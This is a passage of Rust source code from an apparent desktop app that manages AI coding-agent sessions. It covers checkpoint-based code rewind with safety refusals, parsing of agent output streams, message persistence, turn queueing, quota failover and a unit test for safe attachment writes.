    let path = std::path::PathBuf::from(&current_wt.path);
    if !path.is_dir() {
        return Ok(());
    }
    let shadow = crate::checkpoint::shadow_repo_for(wt.id)?;
    let snap = tokio::task::spawn_blocking(move || {
        crate::checkpoint::snapshot(&path, &shadow, session_id, turn_id)
    })
    .await??;
    repo::insert_code_checkpoint(
        db,
        wt.id,
        session_id,
        user_row_id,
        turn_id,
        &snap.shadow_sha,
        &snap.head_sha,
        &serde_json::json!(snap.nested_repos).to_string(),
        &snap.index_tree,
    )
    .await?;
    drop(_op);
    drop(op_guard);
    Ok(())
}

/// Everything a code restore needs, resolved (and validated) before any
/// mutation begins.
struct CodeTarget {
    session_id: i32,
    worktree_id: i32,
    direction_id: i32,
    repo_id: i32,
    path: std::path::PathBuf,
    shadow: std::path::PathBuf,
    base_commit: String,
    shadow_sha: String,
    head_sha: String,
    /// Nested git repo dirs present at the checkpoint — the restore removes
    /// exactly the nested repos NOT in this manifest (created after it).
    nested_repos: Vec<String>,
    /// Tree of the real index at the checkpoint ("" for pre-m0039 rows →
    /// the restore falls back to HEAD).
    index_tree: String,
    /// The lane's recorded branch: a reset --hard must only ever move THIS
    /// branch (the agent may have switched the checkout elsewhere).
    branch: String,
}

/// The checkpoint a code rewind restores to. Errors honestly when the lane
/// can't be restored: a reused checkout is never weft's to reset, and a
/// message without a recorded checkpoint (old session, snapshot skipped or
/// failed) has no state to return to.
async fn resolve_code_target(
    db: &Db,
    wt: &crate::store::entities::worktree::Model,
    session_id: Option<i32>,
    message_id: i32,
) -> anyhow::Result<CodeTarget> {
    if !wt.created_checkout {
        return Err(anyhow::anyhow!("该 worktree 是复用的检出，不支持代码回退"));
    }
    // An initialized submodule would be silently UNDER-restored (nested-repo
    // edits are invisible to the parent's snapshot/restore) — refuse honestly.
    if crate::checkpoint::has_initialized_submodules(std::path::Path::new(&wt.path)) {
        return Err(anyhow::anyhow!(
            "该 worktree 含 submodule，暂不支持代码回退"
        ));
    }
    let Some(ckpt) = repo::code_checkpoint_for(db, wt.id, message_id).await? else {
        return Err(anyhow::anyhow!("该消息没有代码检查点（旧会话或快照失败）"));
    };
    // A nested repo present AT the checkpoint was never content-tracked — a
    // restore would keep its post-checkpoint edits silently. Refuse honestly
    // (restore bails on the same condition as a backstop).
    let nested_repos: Vec<String> = serde_json::from_str(&ckpt.nested_repos).unwrap_or_default();
    if !nested_repos.is_empty() {
        return Err(anyhow::anyhow!(
            "该检查点包含嵌套 git 仓库，暂不支持代码回退"
        ));
    }
    let Some(sid) = session_id else {
        return Err(anyhow::anyhow!("lead 会话没有 worktree，不支持代码回退"));
    };
    Ok(CodeTarget {
        session_id: sid,
        worktree_id: wt.id,
        direction_id: wt.direction_id,
        repo_id: wt.repo_id,
        path: std::path::PathBuf::from(&wt.path),
        shadow: crate::checkpoint::shadow_repo_for(wt.id)?,
        base_commit: wt.base_commit.clone(),
        shadow_sha: ckpt.shadow_sha,
        head_sha: ckpt.head_sha,
        nested_repos,
        index_tree: ckpt.index_tree,
        branch: wt.branch.clone(),
    })
}

/// True when a DIFFERENT session sharing this (direction, repo) worktree has
/// a turn in flight — a code restore would wipe its edits mid-write. The
/// rewind reservation only covers this session's own engine, so siblings are
/// checked explicitly. Uses try_lock: a peer whose mutex is held (e.g. while
/// IT is checkpointing or dispatching) counts as busy — conservative and
/// deadlock-free (this check itself runs while our own lock may be held).
/// (Best-effort after all: a false positive just skips/refuses one round.)
async fn sibling_turn_busy(
    app: &AppHandle,
    db: &Db,
    direction_id: i32,
    repo_id: i32,
    our_session_id: i32,
) -> anyhow::Result<bool> {
    let sessions = repo::sessions_for(db, direction_id, repo_id).await?;
    let state = app.state::<LeadChatState>();
    for s in sessions {
        if s.id == our_session_id {
            continue;
        }
        if let Some(e) = state.get(s.id as i64) {
            match e.try_lock() {
                Ok(g) => {
                    if g.turn.busy {
                        return Ok(true);
                    }
                }
                // The peer's mutex is held right now — treat as busy rather
                // than await it (two resident siblings could otherwise
                // deadlock waiting on each other's lock).
                Err(_) => return Ok(true),
            }
        }
    }
    Ok(false)
}

/// The rewind divider row: one system/rewind marker inserted where the
/// truncation happened so every surface renders a divider between the kept
/// past and the rewound future. Rides the normal insert + Push::Message path.
async fn insert_rewind_marker(
    app: &AppHandle,
    db: &Db,
    thread_id: i32,
    session_id: Option<i32>,
    turn_id: i32,
    from_message_id: i32,
    deleted: u64,
) {
    let content = serde_json::json!({
        "from_message_id": from_message_id,
        "deleted": deleted,
    })
    .to_string();
    match repo::insert_lead_message(
        db, thread_id, session_id, turn_id, "system", "rewind", &content, "complete",
    )
    .await
    {
        Ok(m) => {
            let _ = app.emit(
                EVENT,
                Push::Message {
                    thread_id,
                    message: m,
                },
            );
        }
        Err(e) => eprintln!("[weft] rewind marker insert failed: {e}"),
    }
}

/// Engine fields `rewind` snapshots under one lock (no lock held across the
/// fork / stop / DB awaits).
struct RewindSnap {
    thread_id: i32,
    session_id: Option<i32>,
    tool: String,
    command: Option<String>,
    extra_args: Vec<String>,
    extra_env: Vec<(String, String)>,
    cwd: std::path::PathBuf,
    native_id: Option<String>,
    /// The prepend the FIRST ACP user turn carries (`{system}\n\n{user}`).
    /// Needed to strip it exactly during a rewind match — guessing the split
    /// by blank line mis-handles multi-paragraph prompts.
    system_prompt: String,
    codex_client: Option<crate::codex_app_server::Client>,
    #[allow(dead_code)]
    acp_client: Option<crate::acp::runtime::ClientHandle>,
}

/// `thread/fork` at `last_turn_id`: ride the session's live app-server
/// connection when there is one, else open a temporary one (same connect as
/// spawn_codex_turn) and shut it down right after.
async fn fork_codex_thread(
    snap: &RewindSnap,
    thread_id: &str,
    last_turn_id: &str,
) -> anyhow::Result<String> {
    if let Some(c) = &snap.codex_client {
        if c.is_alive().await {
            return c.fork_thread(thread_id, Some(last_turn_id)).await;
        }
    }
    let program = crate::tool_command::effective(snap.command.as_deref(), &snap.tool);
    // Same trust pre-accept as spawn_codex_turn, or thread/fork can block on
    // codex's folder-trust prompt.
    crate::codex::ensure_codex_trusted(&snap.cwd);
    let owner = match snap.session_id {
        Some(s) => crate::proc_registry::Owner::session(s.to_string()),
        None => crate::proc_registry::Owner::lead_thread(snap.thread_id.to_string()),
    };
    let c = crate::codex_app_server::Client::connect_session(
        &program,
        &snap.extra_args,
        &snap.extra_env,
        &snap.cwd,
        owner,
    )
    .await?;
    let r = c.fork_thread(thread_id, Some(last_turn_id)).await;
    c.shutdown_and_reap().await;
    r
}

fn spawn_reader(
    app: AppHandle,
    db: Db,
    eng: EngineRef,
    stdout: tokio::process::ChildStdout,
    generation: u64,
    quota_command: String,
) {
    tauri::async_runtime::spawn(async move {
        let mut lines = BufReader::new(stdout).lines();
        let mut saw_event = false;
        while let Ok(Some(line)) = lines.next_line().await {
            let mut inner = eng.lock().await;
            if inner.generation != generation {
                return; // superseded by a respawn/stop
            }
            let thread_id = inner.thread_id;
            // Per-turn dialects carry the native session id on their events.
            if inner.native_id.is_none() {
                if let Some(native) = crate::adapters::adapter_for(&inner.tool)
                    .and_then(|a| a.extract_native_id(&line))
                {
                    inner.native_id = Some(native.clone());
                    if let Some(sid) = inner.session_id {
                        let _ = repo::set_session_native_id(&db, sid, &native).await;
                    } else {
                        let _ = repo::set_lead_native_id(&db, thread_id, &native).await;
                    }
                    let _ = app.emit(
                        EVENT,
                        Push::Init {
                            thread_id,
                            session_id: inner.session_id,
                            native_id: native,
                            slash_commands: inner.slash_commands.clone(),
                            mcp_servers: inner.last_mcp_servers.clone(),
                            tools: inner.last_tools.clone(),
                            model: inner.last_model.clone(),
                            window: inner.last_window,
                            mcp_known: false,
                        },
                    );
                }
            }
            // Issue #97: a structured usage-limit reading, independent of the
            // main event classification below (claude's `rate_limit_event` can
            // arrive on any line, not just the first) — lands in the
            // account-scoped quota hub directly, never as a chat row.
            if let Some(snapshot) =
                crate::adapters::adapter_for(&inner.tool).and_then(|a| a.quota_signal(&line))
            {
                if inner.turn.busy && snapshot.status == crate::engine_quota::QuotaStatus::Exceeded
                {
                    inner.turn.quota_exceeded = true;
                }
                crate::engine_quota::report_for_command(snapshot, &quota_command);
            }
            let event = crate::adapters::adapter_for(&inner.tool)
                .map(|a| a.parse_line(&line))
                .unwrap_or(super::proto::ChatEvent::Other);
            if !matches!(event, super::proto::ChatEvent::Other) {
                saw_event = true;
            }
            if super::proto::is_agent_activity(&event) {
                note_turn_activity(&app, &db, &eng, &mut inner);
            }
            match event {
                super::proto::ChatEvent::Init {
                    session_id,
                    slash_commands,
                    mcp_servers,
                    tools,
                    model,
                } => {
                    inner.native_id = Some(session_id.clone());
                    let slash_commands =
                        merge_init_slash_commands(&inner.slash_commands, slash_commands);
                    inner.slash_commands = slash_commands.clone();
                    let window = model.as_deref().and_then(super::window::context_window);
                    // Mirror the frontend's metaFromInit invariant: only an init
                    // that carries a model is authoritative (may replace, even
                    // with empty lists — the session truly has no MCP). A
                    // model-less/partial init is fill-only, or the checkpoint
                    // below would persist a blank snapshot over restored meta
                    // merely because the chat was reopened after a relaunch.
                    if model.is_some() {
                        inner.last_mcp_servers = mcp_servers.clone();
                        inner.last_tools = tools.clone();
                        inner.last_model = model.clone();
                        inner.last_window = window;
                    } else {
                        if inner.last_mcp_servers.is_empty() {
                            inner.last_mcp_servers = mcp_servers.clone();
                        }
                        if inner.last_tools.is_empty() {
                            inner.last_tools = tools.clone();
                        }
                    }
                    // Persist at init too: if the app dies mid-turn, the
                    // MCP/model snapshot still survives the relaunch.
                    persist_engine_meta(&db, &inner).await;
                    if let Some(sid) = inner.session_id {
                        let _ = repo::set_session_native_id(&db, sid, &session_id).await;
                    } else {
                        let _ = repo::set_lead_native_id(&db, thread_id, &session_id).await;
                    }
                    let _ = app.emit(
                        EVENT,
                        Push::Init {
                            thread_id,
                            session_id: inner.session_id,
                            native_id: session_id,
                            slash_commands,
                            mcp_servers,
                            tools,
                            model,
                            window,
                            mcp_known: false,
                        },
                    );
                }
                super::proto::ChatEvent::Commands { commands } => {
                    let commands = merge_init_slash_commands(&inner.slash_commands, commands);
                    inner.slash_commands = commands.clone();
                    let _ = app.emit(
                        EVENT,
                        Push::Init {
                            thread_id,
                            session_id: inner.session_id,
                            native_id: inner.native_id.clone().unwrap_or_default(),
                            slash_commands: commands,
                            mcp_servers: inner.last_mcp_servers.clone(),
                            tools: inner.last_tools.clone(),
                            model: inner.last_model.clone(),
                            window: inner.last_window,
                            mcp_known: false,
                        },
                    );
                }
                super::proto::ChatEvent::TextDelta { text, .. } => {
                    let sid = inner.session_id;
                    let turn = inner.turn_id;
                    let row = match &mut inner.current {
                        Some(c) => {
                            c.1.push_str(&text);
                            c.0
                        }
                        None => {
                            let Ok(m) = repo::insert_lead_message(
                                &db,
                                thread_id,
                                sid,
                                turn,
                                "assistant",
                                "text",
                                r#"{"text":""}"#,
                                "streaming",
                            )
                            .await
                            else {
                                continue;
                            };
                            let id = m.id;
                            inner.current = Some((id, text.clone(), std::time::Instant::now()));
                            let _ = app.emit(
                                EVENT,
                                Push::Message {
                                    thread_id,
                                    message: m,
                                },
                            );
                            id
                        }
                    };
                    // Throttle DB snapshots + IM streaming frames; the live UI rides raw Delta events.
                    // Read the in-flight turn's tag before borrowing inner.current mutably.
                    let origin_tag = inner.current_origin_tag.clone();
                    if let Some(c) = &mut inner.current {
                        if c.2.elapsed().as_millis() >= STREAM_THROTTLE_MS {
                            c.2 = std::time::Instant::now();
                            let content = serde_json::json!({ "text": c.1 }).to_string();
                            let _ =
                                repo::update_lead_message(&db, row, &content, "streaming").await;
                            emit_lead_delta(&app, thread_id, row, &c.1, false, origin_tag);
                        }
                    }
                    let _ = app.emit(
                        EVENT,
                        Push::Delta {
                            thread_id,
                            message_id: row,
                            text,
                        },
                    );
                }
                super::proto::ChatEvent::Assistant {
                    texts, tools, uuid, ..
                } => {
                    // claude/exec/opencode never populate agent_thread (no
                    // collab/sub-agent concept in these dialects) — ignored (`..`).
                    // claude assistant events carry the transcript uuid — the
                    // rewind anchor candidate for this turn (last one wins).
                    if uuid.is_some() {
                        inner.last_assistant_uuid = uuid;
                    }
                    // A finished text block: finalize the streaming row with the
                    // authoritative full text. Some turns have NO deltas at all —
                    // built-in slash commands reply via a synthetic assistant
                    // message — so a missing streaming row means insert, not drop.
                    if !texts.is_empty() {
                        // Sentinels are scanned across the joined body, so the
                        // join+extract order is load-bearing — a marker split
                        // across two text blocks would otherwise slip through.
                        let full = texts.join("\n\n");
                        // Fork <weft:*> sentinels out of the body before persisting:
                        // action_card lives as its own row so the UI can render the
                        // card without parsing prose; list_repos triggers a stdin
                        // reply (handled below) and produces no row of its own.
                        let (clean, sentinels) = super::sentinels::extract_sentinels_with(
                            &full,
                            inner.session_id.is_none(),
                        );
                        let content = serde_json::json!({ "text": clean }).to_string();
                        match inner.current.take() {
                            Some((id, _, _)) => {
                                let _ =
                                    repo::update_lead_message(&db, id, &content, "complete").await;
                                // When sentinels were stripped, the live row still
                                // shows the raw streamed tags — send the cleaned
                                // body so the UI replaces it without a reload
                                // (test_cases bodies are entire documents).
                                let stripped = clean != full;
                                let _ = app.emit(
                                    EVENT,
                                    Push::Finalize {
                                        thread_id,
                                        message_id: id,
                                        status: "complete".into(),
                                        content: if stripped { Some(clean.clone()) } else { None },
                                        seq: None,
                                    },
                                );
                                emit_lead_out(
                                    &app,
                                    thread_id,
                                    id,
                                    &clean,
                                    inner.current_origin_tag.clone(),
                                );
                            }
                            None => {
                                let (sid, turn) = (inner.session_id, inner.turn_id);
                                if let Ok(m) = repo::insert_lead_message(
                                    &db,
                                    thread_id,
                                    sid,
                                    turn,
                                    "assistant",
                                    "text",
                                    &content,
                                    "complete",
                                )
                                .await
                                {
                                    let mid = m.id;
                                    let _ = app.emit(
                                        EVENT,
                                        Push::Message {
                                            thread_id,
                                            message: m,
                                        },
                                    );
                                    emit_lead_out(
                                        &app,
                                        thread_id,
                                        mid,
                                        &clean,
                                        inner.current_origin_tag.clone(),
                                    );
                                }
                            }
                        }
                        // Persist / answer sentinels in encounter order (shared with
                        // the app-server consumer).
                        apply_lead_sentinels(&app, &db, &mut inner, thread_id, sentinels).await;
                    }
                    // Every dialect's tool calls become inline `kind:"tool"` rows.
                    // claude/exec/opencode: never a sub-agent branch (issue #99).
                    persist_tool_calls(&app, &db, &mut inner, tools, None).await;
                }
                super::proto::ChatEvent::ToolResults { items } => {
                    merge_tool_results(&app, &db, &mut inner, items).await;
                }
                super::proto::ChatEvent::Usage { .. } => {}
                super::proto::ChatEvent::TurnEnd {
                    is_error,
                    context_tokens,
                } => {
                    let structured_exceeded = inner.turn.quota_exceeded;
                    if let Some(ct) = context_tokens {
                        inner.last_context_tokens = Some(ct);
                        let _ = app.emit(
                            EVENT,
                            Push::Usage {
                                thread_id,
                                session_id: inner.session_id,
                                context_tokens: ct,
                                window: inner.last_window,
                                model: inner.last_model.clone(),
                            },
                        );
                    }
                    // Same turn-end checkpoint as the app-server consumer: the
                    // reader transports (claude / codex exec / opencode) must
                    // persist too, or their sessions relaunch with stale meta.
                    persist_engine_meta(&db, &inner).await;
                    let status = if inner.interrupting {
                        "interrupted"
                    } else if is_error {
                        "error"
                    } else {
                        "complete"
                    };
                    inner.interrupting = false;
                    // A cleanly finished turn stamps its rewind anchor (claude:
                    // the turn's last assistant-event uuid) on the user row that
                    // opened it. Interrupted/error turns write nothing — the
                    // previous completed turn's anchor stands.
                    if status == "complete" {
                        if let (Some(row), Some(anchor)) =
                            (inner.turn_user_row, inner.last_assistant_uuid.clone())
                        {
                            if row > 0 {
                                let _ = repo::set_lead_message_anchor(&db, row, &anchor).await;
                            }
                        }
                    }
                    // Finalize any tool rows still awaiting a result — an
                    // interrupted or errored turn can leave a `tool_use` without
                    // its `tool_result`, which would otherwise spin forever.
                    let orphans: Vec<(i32, serde_json::Value)> =
                        inner.tool_rows.drain().map(|(_, v)| v).collect();
                    finalize_orphan_tool_rows(&app, &db, thread_id, orphans, status).await;
                    if let Some((id, text, _)) = inner.current.take() {
                        let _ = repo::update_lead_message(
                            &db,
                            id,
                            &serde_json::json!({ "text": text }).to_string(),
                            status,
                        )
                        .await;
                        let _ = app.emit(
                            EVENT,
                            Push::Finalize {
                                thread_id,
                                message_id: id,
                                status: status.into(),
                                content: None,
                                seq: None,
                            },
                        );
                        if status == "complete" {
                            emit_lead_out(
                                &app,
                                thread_id,
                                id,
                                &text,
                                inner.current_origin_tag.clone(),
                            );
                        }
                    } else if let Ok(Some(m)) = insert_terminal_assistant_if_missing(
                        &db,
                        thread_id,
                        inner.session_id,
                        inner.turn_id,
                        status,
                    )
                    .await
                    {
                        let _ = app.emit(
                            EVENT,
                            Push::Message {
                                thread_id,
                                message: m,
                            },
                        );
                    }
                    let next = inner.turn.on_turn_end();
                    // Set BEFORE `next`'s input is dispatched below so its output
                    // frames carry the retargeted origin tag.
                    advance_dequeued_turn(&mut inner, &next);
                    inner.last_assistant_uuid = None;
                    if let Some(next) = next {
                        inner.turn_id += 1;
                        let next_turn_id = inner.turn_id;
                        let session_id = inner.session_id;
                        // Captured at dequeue, under this lock: a stop-then-restart
                        // before the spawned task runs clears `stopped` but bumps the
                        // epoch, and the canceled queued message must not launch.
                        let dequeue_epoch = inner.reset_epoch;
                        if per_turn(&inner.tool) {
                            let (a, d, e) = (app.clone(), db.clone(), eng.clone());
                            tauri::async_runtime::spawn(async move {
                                // Pre-turn checkpoint for the dequeued turn,
                                // awaited before the spawn dispatches its message.
                                if let Some(qid) = next.queue_id {
                                    snapshot_turn_checkpoint(&a, &d, session_id, next_turn_id, qid)
                                        .await;
                                }
                                if let Err(err) = spawn_turn(
                                    a.clone(),
                                    d.clone(),
                                    e.clone(),
                                    next.clone(),
                                    Some(dequeue_epoch),
                                )
                                .await
                                {
                                    eprintln!("[weft] queued per-turn delivery failed: {err}");
                                    // The spawn guard may have CANCELED (stop/interrupt/
                                    // epoch) rather than failed; and the popped row is
                                    // no longer in the queue for the rollback to sweep.
                                    let status = drain_failure_status(&e, dequeue_epoch).await;
                                    rollback_failed_turn(&a, &d, &e, next_turn_id, status).await;
                                    finalize_dequeued_row(&a, &d, thread_id, &next, status).await;
                                } else {
                                    mark_queued_delivered(&a, &d, thread_id, session_id, &next)
                                        .await;
                                }
                            });
                        } else {
                            // Pre-turn checkpoint for the dequeued turn, awaited
                            // before the resident write dispatches its message
                            // (both run under this lock).
                            if let Some(qid) = next.queue_id {
                                snapshot_turn_checkpoint(&app, &db, session_id, next_turn_id, qid)
                                    .await;
                            }
                            if let Err(e) = write_user(&mut inner, &next).await {
                                eprintln!("[weft] queued resident delivery failed: {e}");
                                drop(inner);
                                // A stop may have closed this stdin (cancel, not
                                // failure); and the popped row is no longer in the
                                // queue for the rollback to sweep.
                                let status = drain_failure_status(&eng, dequeue_epoch).await;
                                rollback_failed_turn(&app, &db, &eng, next_turn_id, status).await;
                                finalize_dequeued_row(&app, &db, thread_id, &next, status).await;
                                return;
                            } else {
                                mark_queued_delivered(&app, &db, thread_id, session_id, &next)
                                    .await;
                            }
                        }
                    }
                    let still_busy = inner.turn.busy;
                    persist_activity(
                        &db,
                        inner.session_id,
                        thread_id,
                        if still_busy { "running" } else { "idle" },
                    )
                    .await;
                    inner.clock.on_turn_end(still_busy);
                    let state = if still_busy { "busy" } else { "idle" };
                    let _ = app.emit(
                        EVENT,
                        Push::Turn {
                            thread_id,
                            session_id: inner.session_id,
                            state: state.into(),
                            queue: queue_items(&inner.turn),
                        },
                    );
                    // issue #97: same auto fail-over candidate check as
                    // `codex_consumer`'s TurnEnd arm — decoupled (own task) so
                    // it can safely re-lock `eng` without deadlocking THIS task,
                    // which is still holding `inner` right here.
                    if should_attempt_quota_failover(status, structured_exceeded, still_busy) {
                        crate::lead_chat::commands::spawn_quota_failover_check(
                            app.clone(),
                            db.clone(),
                            thread_id,
                            inner.session_id,
                            inner.tool.clone(),
                            structured_exceeded,
                        );
                    }
                }
                _ => {}
            }
        }
        // EOF. Per-turn dialects end every turn this way (clean exit); for the
        // long-lived claude process it means a crash/kill — history stays, the
        // next send resumes.
        let mut inner = eng.lock().await;
        if inner.generation == generation && per_turn(&inner.tool) {
            let status = if inner.interrupting {
                "interrupted"
            } else {
                "complete"
            };
            inner.interrupting = false;
            // A per-turn process killed/crashed after a tool started but before its
            // item.completed leaves a streaming tool row no TurnEnd ever drained —
            // finalize it here too, so it doesn't spin forever in the timeline.
            let eof_thread_id = inner.thread_id;
            let orphans: Vec<(i32, serde_json::Value)> =
                inner.tool_rows.drain().map(|(_, v)| v).collect();
            finalize_orphan_tool_rows(&app, &db, eof_thread_id, orphans, status).await;
            // A turn that produced ZERO events died on startup (auth, bad args,
            // session lock …) — surface it instead of completing silently.
            if !saw_event && status == "complete" {
                if let Ok(m) = repo::insert_lead_message(
                    &db,
                    inner.thread_id,
                    inner.session_id,
                    inner.turn_id,
                    "assistant",
                    "text",
                    r#"{"text":"(the agent process exited without producing any output — check the app log)"}"#,
                    "error",
                )
                .await
                {
                    let _ = app.emit(EVENT, Push::Message { thread_id: inner.thread_id, message: m });
                }
            }
            if let Some((id, text, _)) = inner.current.take() {
                let _ = repo::update_lead_message(
                    &db,
                    id,
                    &serde_json::json!({ "text": text }).to_string(),
                    status,
                )
                .await;
                let _ = app.emit(
                    EVENT,
                    Push::Finalize {
                        thread_id: inner.thread_id,
                        message_id: id,
                        status: status.into(),
                        content: None,
                        seq: None,
                    },
                );
                // 仅 complete 才回流 IM——interrupted/error 的半截不应上桥。
                if status == "complete" {
                    emit_lead_out(
                        &app,
                        inner.thread_id,
                        id,
                        &text,
                        inner.current_origin_tag.clone(),
                    );
                }
            }
            inner.child = None;
            // Release the session_gate slot HERE, not on the next spawn: a per-turn
            // process (codex/opencode) has no resident process between turns, so
            // once its EOF is processed there is no live child left for the permit
            // to represent. Leaving it held until `spawn_turn` overwrites
            // `child_permit` (issue #112 dashboard review, session_gate.rs P2) meant
            // a session sitting idle after its last turn — no queued follow-up,
            // engine just idle — kept counting as an active slot in
            // `session_gate::active_session_slots()` forever, until the NEXT turn
            // (which might be minutes/never). If `next` (below) immediately spawns a
            // queued turn, it re-acquires its own permit inside `spawn_turn` — fairly,
            // through the same queue any other waiting session would go through,
            // rather than this session silently keeping the slot it already earned.
            //
            // The bearer dies with it: a per-turn dialect's end-of-turn EOF is a
            // real child death that no teardown chokepoint sees, and the session's
            // rows keep `session_is_live` true afterwards. Runs BEFORE the queued
            // dispatch below on purpose — that respawn goes through `spawn_turn`,
            // which re-mints, so the next child still starts with a live bearer.
            // Inside this branch's `generation` guard, as `release_child_slot`
            // requires: a superseded reader must not revoke the newer child's.
            release_child_slot(&mut inner);
            let next = inner.turn.on_turn_end();
            // A kill-only interrupt (see interrupt()) leaves `generation`/the
            // queue untouched, so THIS EOF branch — not a reset — is what runs
            // for a per-turn dialect's interrupted turn; it must retarget
            // turn_user_row/current_origin_tag to `next` like every other
            // dequeue site (see advance_dequeued_turn's own doc for why this
            // one previously didn't, and what broke).
            advance_dequeued_turn(&mut inner, &next);
            if let Some(next) = next {
                inner.turn_id += 1;
                let next_turn_id = inner.turn_id;
                let thread_id = inner.thread_id;
                let session_id = inner.session_id;
                // Captured at dequeue, under this lock — see the per-turn drain
                // above: stop-then-restart must not launch a canceled message.
                let dequeue_epoch = inner.reset_epoch;
                let (a, d, e) = (app.clone(), db.clone(), eng.clone());
                tauri::async_runtime::spawn(async move {
                    if let Err(err) = spawn_turn(
                        a.clone(),
                        d.clone(),
                        e.clone(),
                        next.clone(),
                        Some(dequeue_epoch),
                    )
                    .await
                    {
                        eprintln!("[weft] queued per-turn delivery failed: {err}");
                        // The spawn guard may have CANCELED (stop/interrupt/epoch)
                        // rather than failed; and the popped row is no longer in
                        // the queue for the rollback to sweep.
                        let status = drain_failure_status(&e, dequeue_epoch).await;
                        rollback_failed_turn(&a, &d, &e, next_turn_id, status).await;
                        finalize_dequeued_row(&a, &d, thread_id, &next, status).await;
                    } else {
                        mark_queued_delivered(&a, &d, thread_id, session_id, &next).await;
                    }
                });
            }
            let still_busy = inner.turn.busy;
            persist_activity(
                &db,
                inner.session_id,
                inner.thread_id,
                if still_busy { "running" } else { "idle" },
            )
            .await;
            inner.clock.on_turn_end(still_busy);
            let state = if still_busy { "busy" } else { "idle" };
            let _ = app.emit(
                EVENT,
                Push::Turn {
                    thread_id: inner.thread_id,
                    session_id: inner.session_id,
                    state: state.into(),
                    queue: queue_items(&inner.turn),
                },
            );
            return;
        }
        if inner.generation == generation {
            // A row still streaming at death closes as interrupted/error.
            let status = if inner.interrupting {
                "interrupted"
            } else {
                "error"
            };
            let queued_status = status;
            let thread_id = inner.thread_id;
            let session_id = inner.session_id;
            inner.interrupting = false;
            // claude's long-lived process died mid-turn: finalize any tool rows
            // still awaiting a result so they don't spin forever in the timeline.
            let orphans: Vec<(i32, serde_json::Value)> =
                inner.tool_rows.drain().map(|(_, v)| v).collect();
            finalize_orphan_tool_rows(&app, &db, thread_id, orphans, status).await;
            if let Some((id, text, _)) = inner.current.take() {
                let _ = repo::update_lead_message(
                    &db,
                    id,
                    &serde_json::json!({ "text": text }).to_string(),
                    status,
                )
                .await;
                let _ = app.emit(
                    EVENT,
                    Push::Finalize {
                        thread_id: inner.thread_id,
                        message_id: id,
                        status: status.into(),
                        content: None,
                        seq: None,
                    },
                );
            }
            inner.child = None;
            // Sibling of the per-turn EOF release above: the resident claude
            // process just died (crash, or the kill an `interrupt()` issued) and
            // nothing respawns it until the next send — which may never come. Its
            // slot has to go back now, or a session the user interrupted and then
            // left alone counts as active forever; its bearer likewise, or an
            // orphaned descendant outlives the crash still holding a live one.
            // `ensure_running_locked` re-mints if that next send ever arrives.
            release_child_slot(&mut inner);
            inner.stdin = None;
            inner.turn = TurnState::default();
            inner.clock = TurnClock::default();
            inner.turn_user_row = None;
            // A resident child crash does not cancel the async receipt task. Keep
            // its token until the DB consume result releases the reservation.
            // The turn is unconditionally reset to idle here; persist that so a
            // resident-process death (incl. interrupt→kill) doesn't leave the row
            // stuck "running" and falsely revive an engine on the next boot.
            persist_activity(&db, session_id, thread_id, "idle").await;
            let _ = app.emit(
                EVENT,
                Push::Turn {
                    thread_id,
                    session_id,
                    state: "stopped".into(),
                    queue: Vec::new(),
                },
            );
            drop(inner);
            let _ = mark_queued_status(&app, &db, thread_id, session_id, queued_status).await;
        }
    });
}

/// M2-4 tap: 把 assistant 段「complete」时的清洗文本广播给订阅者
/// （IM 桥据此回流到飞书话题）。`LeadOutHub` 未注册或无订阅都静默——
/// 单测/单进程跑的 `tauri::test::mock_app` 没注册该状态也不会 panic。
fn emit_lead_out(
    app: &AppHandle,
    thread_id: i32,
    message_id: i32,
    text: &str,
    origin_tag: Option<String>,
) {
    let t = text.trim();
    if t.is_empty() {
        return;
    }
    if let Some(hub) = app.try_state::<super::out_hub::LeadOutHub>() {
        hub.emit(super::out_hub::LeadOut {
            thread_id,
            message_id,
            text: t.to_string(),
            origin_tag: origin_tag.clone(),
        });
    }
    // streaming 收尾：每个「段落完成」处同时发一帧 done（与 LeadOut 同源、同清洗后文本），
    // IM 桥据 done 定稿流式卡片。中间帧由两处 500ms 节流点发（见 emit_lead_delta）。
    emit_lead_delta(app, thread_id, message_id, t, true, origin_tag);
}

/// streaming 增量帧。`accumulated` 是到当前为止的全文；`done` 标记最后一帧。
/// 未注册 LeadDeltaHub（如 mock_app 测试）静默——不 panic。
fn emit_lead_delta(
    app: &AppHandle,
    thread_id: i32,
    message_id: i32,
    accumulated: &str,
    done: bool,
    origin_tag: Option<String>,
) {
    if let Some(hub) = app.try_state::<super::delta_hub::LeadDeltaHub>() {
        hub.emit(super::delta_hub::LeadDelta {
            thread_id,
            message_id,
            accumulated: accumulated.to_string(),
            done,
            origin_tag,
        });
    }
}

/// Default-ish engine state shared by unit tests.
#[cfg(test)]
pub(super) fn test_inner(tool: &str) -> EngineInner {
    EngineInner {
        thread_id: 1,
        tool: tool.into(),
        command: None,
        session_id: None,
        cwd: "/tmp".into(),
        extra_args: vec![],
        extra_env: vec![],
        computer_args: vec![],
        computer_env: vec![],
        computer_gen: None,
        system_prompt: String::new(),
        native_id: None,
        pending_context_digest: None,
        slash_commands: vec![],
        turn: TurnState::default(),
        turn_id: 0,
        ask_dir: "lead".into(),
        clock: TurnClock::default(),
        child: None,
        child_reg: None,
        child_permit: None,
        stdin: None,
        current: None,
        open_texts: std::collections::HashMap::new(),
        turn_saw_text: false,
        interrupting: false,
        generation: 0,
        reset_epoch: 0,
        pending_skill_refresh: false,
        pending_command_refresh: false,
        last_context_tokens: None,
        last_model: None,
        last_reasoning: None,
        last_window: None,
        last_mcp_servers: vec![],
        last_tools: vec![],
        probe_seq: 0,
        probe_committed: 0,
        current_origin_tag: None,
        tool_rows: std::collections::HashMap::new(),
        inline_image_rows: std::collections::VecDeque::new(),
        stopped: false,
        codex_client: None,
        acp_client: None,
        acp_pending_asks: Vec::new(),
        turn_user_row: None,
        hidden_receipt_inflight: Arc::new(DashSet::new()),
        last_assistant_uuid: None,
        rewinding: false,
        quota_failover_committing: false,
        tearing_down: false,
        worktree_id: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // —— hardened codex app-server attachment write ——

    /// The happy path: a brand-new path (nothing there yet) writes normally.
    #[cfg(unix)]
    #[test]
    fn write_attachment_no_follow_writes_a_fresh_path() {
        let tmp = tempfile::tempdir().unwrap();
        let p = tmp.path().join("msg1-0-123.png");
        assert!(write_attachment_no_follow(&p, b"hello"));
        assert_eq!(std::fs::read(&p).unwrap(), b"hello");
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::symlink_metadata(&p).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600, "must be created owner-only");
    }

